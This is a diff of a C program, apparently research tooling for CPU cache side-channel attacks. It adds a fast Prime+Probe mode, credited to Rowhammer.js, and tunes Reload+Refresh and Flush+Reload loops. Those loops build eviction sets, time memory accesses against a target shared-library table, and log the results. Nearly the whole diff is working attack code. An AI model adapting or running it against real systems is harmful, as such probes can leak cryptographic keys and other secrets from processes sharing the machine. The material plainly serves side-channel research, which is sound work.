@@ -1,8 +1,12 @@
+#define _GNU_SOURCE
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <sys/mman.h>
+#include <sched.h>
+#include <unistd.h>
+#include <sys/wait.h>
 
 #include "T.h"           /*Shared library*/
 #include "cache_utils.h" /*Cache manipulation functions*/
@@ -19,8 +23,9 @@
 #define FLAGS (MAP_SHARED)
 #endif
 
-#define TIME_LIMIT 190 /*Time for main memory access, must be calibrated*/
-#define CLEAN_REFRESH_TIME 500 /*Time for refresh, must be calibrated*/
+#define TIME_LIMIT 190         /*Time for main memory access, must be calibrated*/
+#define CLEAN_REFRESH_TIME 620 /*Time for refresh, must be calibrated*/
+#define TIME_PRIME 650         /*Time for refresh, must be calibrated*/
 #define NUM_CANDIDATES 3 * CACHE_SET_SIZE *CACHE_SLICES
 #define RES_MEM (1UL * 1024 * 1024) * 4 * CACHE_SIZE
 
@@ -33,13 +38,15 @@ long int candidates_set[NUM_CANDIDATES];
 long int filtered_set[NUM_CANDIDATES];
 long int eviction_set[CACHE_SET_SIZE * CACHE_SLICES];
 long int invariant_part[CACHE_SET_SIZE * CACHE_SLICES];
-long int elements_set[CACHE_SET_SIZE]; // For R+R attacks
+long int elements_set[CACHE_SET_SIZE];          // For R+R attacks
+long int long_eviction_set[CACHE_SET_SIZE * 2]; // For fast P+P attacks
 
 int fd;
 FILE *out_fd;
 uintptr_t phys_addr;
 int slice, set;
 int wait_time;
+int S, C, D;
 
 int main(int argc, char **argv)
 {
@@ -62,7 +69,7 @@ int main(int argc, char **argv)
         }
         target_address = (long int *)get_address_table(target_pos);
         //target_address = (long int *)get_address_quixote(target_pos);
-        printf("Target address %lx \n",target_address);
+        printf("Target address %lx \n", target_address);
     }
     if (strcmp(argv[2], "-fr") == 0)
     {
@@ -83,7 +90,7 @@ int main(int argc, char **argv)
             t = access_timed_flush(target_address);
             if (t < (TIME_LIMIT - 50))
             {
-                printf("%i \n",t);
+                printf("%i \n", t);
                 cont++;
             }
         }
@@ -130,15 +137,17 @@ int main(int argc, char **argv)
         }
 
         /*Set generation*/
-        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES);
+        int tar_set = 30 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
+        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
         initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
         store_invariant_part(eviction_set, invariant_part);
         profile_address(invariant_part, eviction_set, target_address, &set, &slice);
+        printf("Set and Slice %i %i \n", set, slice);
 
         /*Create the eviction set that matches with the target*/
         generate_new_eviction_set(set, invariant_part, eviction_set);
         write_linked_list(eviction_set);
-        long int *prime_address = (long int *) eviction_set[slice * CACHE_SET_SIZE];
+        long int *prime_address = (long int *)eviction_set[slice * CACHE_SET_SIZE];
 
         unsigned long tim = timestamp();
         int t;
@@ -149,7 +158,75 @@ int main(int argc, char **argv)
             tim = timestamp();
             while (timestamp() < tim + wait_time)
                 ;
-            fprintf(out_fd, "%i %lu\n", t, tim);
+            fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
+        }
+        fclose(out_fd);
+        /*Release huge pages*/
+        close(fd);
+        unlink(FILE_NAME);
+        return 0;
+    }
+    else if (!strcmp(argv[2], "-fpp")) //For fast Prime+Probe test
+    {
+        if (argc < 7)
+        {
+            printf("Also expected S,C and D for fast Prime+Probe\n");
+            return -1;
+        }
+        S = atoi(argv[4]);
+        C = atoi(argv[5]);
+        D = atoi(argv[6]);
+        printf("TEST FAST PRIME+PROBE (Rowhammer.js)\n");
+        snprintf(file_name, 40, "test_fpp_%d.txt", wait_time);
+        out_fd = fopen(file_name, "w");
+        if (out_fd == NULL)
+            fprintf(stderr, "Unable to open file\n");
+        /*Reserve huge pages*/
+
+        fd = open(FILE_NAME, O_CREAT | O_RDWR, 0755);
+        if (fd < 0)
+        {
+            perror("Open failed");
+            exit(1);
+        }
+
+        unsigned long reserved_size = RES_MEM;
+        base_address = mmap(ADDR, reserved_size, PROTECTION, MAP_SHARED, fd, 0);
+        if (base_address == NULL)
+        {
+            printf("error allocating\n");
+            exit(1);
+        }
+        if (base_address == MAP_FAILED)
+        {
+            perror("mmap");
+            unlink(FILE_NAME);
+            exit(1);
+        }
+
+        /*Set generation*/
+        int tar_set = 30 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
+        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
+        initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
+        store_invariant_part(eviction_set, invariant_part);
+        profile_address(invariant_part, eviction_set, target_address, &set, &slice);
+        printf("Set and Slice %i %i \n", set, slice);
+
+        /*Create the eviction set that matches with the target*/
+        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, set); //To increase the size of the eviction set
+        generate_new_eviction_set(set, invariant_part, eviction_set);
+        increase_eviction(candidates_set, NUM_CANDIDATES, eviction_set, long_eviction_set, slice, TIME_LIMIT);
+
+        unsigned long tim = timestamp();
+        int t;
+        ///NO PROFILE FOR P+P
+        while (1)
+        {
+            t = fast_prime(long_eviction_set, S, C, D);
+            tim = timestamp();
+            while (timestamp() < tim + wait_time)
+                ;
+            fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
         }
         fclose(out_fd);
         /*Release huge pages*/
@@ -188,7 +265,8 @@ int main(int argc, char **argv)
         }
 
         /*Set generation*/
-        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES);
+        int tar_set = 30 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
+        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
         initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
         store_invariant_part(eviction_set, invariant_part);
         profile_address(invariant_part, eviction_set, target_address, &set, &slice);
@@ -200,7 +278,7 @@ int main(int argc, char **argv)
         long int *prime_address = (long int *)eviction_set[slice * CACHE_SET_SIZE];
         long int *first_el = (long int *)eviction_set[slice * CACHE_SET_SIZE];
         long int *conflict_address = (long int *)eviction_set[(slice + 1) * CACHE_SET_SIZE - 1];
-
+        printf("Set and Slice %i %i \n", set, slice);
         int t, t1;
         unsigned long tim = timestamp();
         int cont = 0;
@@ -215,20 +293,37 @@ int main(int argc, char **argv)
                 cont++;
             }
         }
+        /*Set affinity to current core to avoid variations*/
+        /*int core = sched_getcpu();
+        if (core < 0)
+        {
+            printf("Error getting the CPU \n");
+            return -1;
+        }
+        cpu_set_t mask;
+        CPU_ZERO(&mask);
+        CPU_SET(core, &mask);
+        printf("Core %i \n",core);
+        sched_setaffinity(0, sizeof(cpu_set_t), &mask);
+
+        while (sched_getcpu() != core);*/
+
         /*Prepare the sets for the attack*/
-        prepare_sets(elements_set, conflict_address);
+        prepare_sets(elements_set, conflict_address, TIME_PRIME);
         /*Carry the attack*/
         while (1)
         {
+            cont++;
             t = reload_step(target_address, conflict_address, first_el);
+            lfence();
             t1 = refresh_step(&elements_set[0]);
             tim = timestamp();
             while (timestamp() < tim + wait_time)
                 ;
 #if CLEAN_NOISE
-            if(t1>CLEAN_REFRESH_TIME)
+            if (t1 > CLEAN_REFRESH_TIME)
             {
-                prepare_sets(elements_set, conflict_address);
+                prepare_sets(elements_set, conflict_address, TIME_PRIME);
             }
 #endif
             fprintf(out_fd, "%i %i %lu\n", t, t1, tim);
